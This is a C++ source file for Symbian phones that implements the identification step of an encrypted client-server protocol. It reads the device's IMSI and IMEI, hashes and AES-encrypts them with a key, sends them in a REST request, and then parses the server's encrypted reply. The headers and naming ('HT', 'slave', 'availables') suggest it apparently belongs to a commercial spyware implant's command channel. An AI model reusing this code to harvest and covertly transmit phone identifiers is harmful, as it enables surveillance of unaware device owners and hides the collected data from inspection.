/*
 * StateIdentification.cpp
 *
 *  Created on: 16/feb/2011
 *      Author: Giovanna
 */

#include "StateIdentification.h"
#include "Keys.h"
#include <HT\AES.h>
#include <HT\Phone.h>
#include <HT\ShaUtils.h>
#include <HT\RESTUtils.h>
#include <hash.h>
#include <random.h>


CStateIdentification::CStateIdentification(MStateObserver& aObserver) : CAbstractState(EState_Identification, aObserver)
	{
	}

CStateIdentification::~CStateIdentification()
	{
	delete iRequestData;
	delete iResponseData;
	}

CStateIdentification* CStateIdentification::NewLC(MStateObserver& aObserver)
	{
	CStateIdentification* self = new (ELeave) CStateIdentification(aObserver);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CStateIdentification* CStateIdentification::NewL(MStateObserver& aObserver)
	{
	CStateIdentification* self = CStateIdentification::NewLC(aObserver);
	CleanupStack::Pop(); // self;
	return self;
	}

void CStateIdentification::ConstructL()
	{
	}

void CStateIdentification::ActivateL(const TDesC8& aData)
	{
	// Parameter aData stores the K key
	iSignKey.Copy(aData);
	
	CBufBase* plainBody = CBufFlat::NewL(50);
	CleanupStack::PushL(plainBody);
	
	//append command
	plainBody->InsertL(plainBody->Size(),(TUint8 *)KProto_Id().Ptr(),KProto_Id().Size());
	//append version
	plainBody->InsertL(plainBody->Size(),(TUint8 *)KVERSION().Ptr(),KVERSION().Size());
	//append imsi and imei
	TBuf<16> slave;
	CPhone* phone = CPhone::NewLC();
	phone->GetImsiSync(slave);  
	slave.AppendFill(0,1);
	TUint32 len = slave.Size();
	plainBody->InsertL(plainBody->Size(),&len,sizeof(len));
	plainBody->InsertL(plainBody->Size(),(TUint8 *)slave.Ptr(),slave.Size());
	slave.Zero();
	phone->GetImeiSync(slave);
	CleanupStack::PopAndDestroy(phone);
	slave.AppendFill(0,1);
	len = slave.Size();
	plainBody->InsertL(plainBody->Size(),&len,sizeof(len));
	plainBody->InsertL(plainBody->Size(),(TUint8 *)slave.Ptr(),slave.Size());
	//append sourceId, null
	_LIT(KNull,"\x00\x00");
	len = 2;
	plainBody->InsertL(plainBody->Size(),&len,sizeof(len));
	plainBody->InsertL(plainBody->Size(),(TUint8 *)KNull().Ptr(),2);
	
	HBufC8* result = plainBody->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(plainBody);
	RBuf8 payload(result);
	payload.CleanupClosePushL();
		
	// calculate SHA1
	TBuf8<20> sha;
	ShaUtils::CreateSha(payload,sha);
	//append SHA1
	TInt max = payload.MaxSize() + 20;
	payload.ReAllocL(max);
	payload.Append(sha);
	
	// encrypt an send
	RBuf8 buff(AES::EncryptPkcs5L(payload, KIV, iSignKey));
	CleanupStack::PopAndDestroy(&payload);
	buff.CleanupClosePushL();
	
	//add REST header
	HBufC8* header = iObserver.GetRequestHeaderL();
	TBuf8<32> contentLengthLine;
	contentLengthLine.Append(KContentLength);
	contentLengthLine.AppendNum(buff.Size());
	contentLengthLine.Append(KNewLine);
	iRequestData = HBufC8::NewL(header->Size()+contentLengthLine.Size()+KNewLine().Size()+buff.Size());
	iRequestData->Des().Append(*header);
	delete header;
	iRequestData->Des().Append(contentLengthLine);
	iRequestData->Des().Append(KNewLine);
	iRequestData->Des().Append(buff);
	CleanupStack::PopAndDestroy(&buff);
	
	iObserver.SendStateDataL(*iRequestData);
	}

void CStateIdentification::ProcessDataL(const TDesC8& aData) 
	{
	//free resources
	delete iRequestData;
	iRequestData = NULL;
	
	if(aData.Size()!=0)
		{
		if(iResponseData == NULL)
			{
			iResponseData = aData.AllocL();
			}
		else
			{
			TInt size = iResponseData->Size();
			iResponseData = iResponseData->ReAllocL(size+aData.Size()); //TODO:check this
			iResponseData->Des().Append(aData);
			}
		return;
		}
	
	if(iResponseData->Find(KApplicationOS)==KErrNotFound)
		{
		//server answered with a redirect
		iObserver.ResponseError(KErrContent);
		return;
		}
		
	//extract body from response
	RBuf8 body(CRestUtils::GetBodyL(*iResponseData));
	body.CleanupClosePushL();
	
	RBuf8 plainBody(AES::DecryptPkcs5L(body,KIV,iSignKey));
	CleanupStack::PopAndDestroy(&body);
	plainBody.CleanupClosePushL();
	//check sha1
	if(!ShaUtils::ValidateSha(plainBody.Left(plainBody.Size()-20),plainBody.Right(20)))
		{
		CleanupStack::PopAndDestroy(&plainBody);
		iObserver.ResponseError(KErrSha);
		return;
		}
	//check response
	if(plainBody.Left(4).Compare(KProto_Ok) != 0)
		{
		CleanupStack::PopAndDestroy(&plainBody);
		iObserver.ResponseError(KErrNotOk);
		return;
		}
	//TODO:save the date into a file only if differs 
	//check num of availables: 4 bytes, starting after 16 byte
	TUint numAvailables;
	TUint8* ptr = (TUint8 *)plainBody.Ptr();
	ptr+=16;
	Mem::Copy(&numAvailables,ptr,4);
	if(numAvailables > 0)
		{
		// send availables to protocol
		iObserver.SetAvailables(numAvailables,plainBody.Right(plainBody.Size()-20));
		}
	CleanupStack::PopAndDestroy(&plainBody);
	iObserver.ChangeStateL();
	}

